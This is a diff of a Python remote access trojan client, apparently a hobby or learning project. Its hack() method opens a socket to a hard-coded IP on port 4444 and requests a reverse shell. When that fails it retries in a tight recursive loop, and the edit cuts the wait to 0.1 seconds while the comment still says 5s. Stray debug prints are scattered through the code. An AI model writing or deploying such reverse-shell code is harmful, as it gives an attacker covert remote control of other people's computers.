@@ -27,24 +27,28 @@ class Client:
         '''
         
         # Create client instance
-        self.client = Connection(self.host, self.port)
-        # Open socket connection back to server
-        self.sock = self.client.connect()
+        client = Connection(self.host, self.port)
         
+        # Open socket connection back to server
+        sock = client.connect()
+        
+        print("b")
         # Create shell instance
-        self.shell = Shell(self.sock)
+        shell = Shell(sock)
         # Get a reverse shell back to server
         try:
-            self.shell.get_shell(self.sock)
+            shell.get_shell(sock)
+            print("Shelsfgsagl")
         except:
-            time.sleep(5) # Wait 5s
-            self.sock.close() # Close erroneous connection
+            time.sleep(0.1) # Wait 5s
+            sock.close() # Close erroneous connection
             self.hack() # Retry
-            
-         # Close connection when finished
-        self.sock.close()
+        
+        print("a")
+        # Close connection when finished
+        sock.close()
             
     
 if __name__ == "__main__":
     # Run RAT with specified IP and port
-    Client("10.15.0.2", 4444).hack()
+    Client("192.168.178.69", 4444).hack()
